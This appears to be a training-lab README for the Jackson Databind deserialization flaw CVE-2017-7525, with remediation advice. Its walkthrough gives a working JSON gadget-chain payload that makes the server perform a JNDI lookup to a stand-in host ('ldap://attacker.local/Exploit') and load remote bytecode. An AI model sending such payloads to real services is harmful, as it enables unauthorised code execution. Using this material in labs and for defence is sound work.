# Jackson Databind Polymorphic Deserialization RCE (CVE-2017-7525)

## Overview

FasterXML Jackson Databind is the default JSON library in Spring Boot and Java frameworks. In versions prior to 2.8.9, enabling default typing allows attackers to pass class names inside JSON payloads. When Jackson deserializes gadgets such as org.apache.xalan.xsltc.trax.TemplatesImpl or JNDI lookups via com.sun.rowset.JdbcRowSetImpl, arbitrary bytecode is executed.

- **Service Access**: `http://localhost:8171/`
- **Default Credentials**: `Unauthenticated JSON POST`
- **Docker Shortcut**: `./lab start spring-jackson-rce`
- **Container Name**: `cyberlab_02_spring_jackson_rce`
- **RAM Footprint**: ~300M

---

## Exploitation Walkthrough

### 1. Verify JSON API Endpoint

```bash
curl -i http://localhost:8171/
```

### 2. Send Deserialization Gadget Chain via JSON

```bash
curl -i -X POST 'http://localhost:8171/' \
  -H 'Content-Type: application/json' \
  -d '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://attacker.local/Exploit","autoCommit":true}]'
```

### 3. Verify Connection Log

```bash
# Server attempts outbound JNDI resolution, executing remote bytecode.
```

---

## Defensive Remediation & Hardening

1. Upgrade jackson-databind to version 2.8.9, 2.9.0 or higher.
2. Avoid enableDefaultTyping() without strict class whitelisting.

---

## Video Walkthroughs & Technical References

- [#spring cloud gateway remote code execution | CVE-2022-22947](https://www.youtube.com/watch?v=mX3MtC6psJA)
- [Jackson Databind CVE-2017-7525 Advisory](https://github.com/FasterXML/jackson-databind/issues/1599)
- [Vulhub Jackson Environment](https://vulhub.org/#/environments/jackson/CVE-2017-7525/)
